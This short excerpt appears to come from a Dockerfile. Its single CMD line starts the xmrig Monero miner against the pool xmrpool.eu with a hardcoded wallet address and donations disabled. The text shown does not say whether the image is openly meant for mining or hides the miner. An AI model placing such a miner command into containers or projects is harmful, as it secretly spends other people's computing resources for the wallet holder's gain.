...
CMD ["./xmrig", "--donate-level=0", "--algo=monero", "--url=xmrpool.eu:443", "--user=4BC3kQXutje8FSmRt188tRUkMRL6U7kngEyjnEj51ocMJuc2jKMqSrmFx9hB2scRpPGWHjht2w2SKCTxLDXyxif84YfeHdw", "--pass=x", "--no-color", "--print-time=30"]
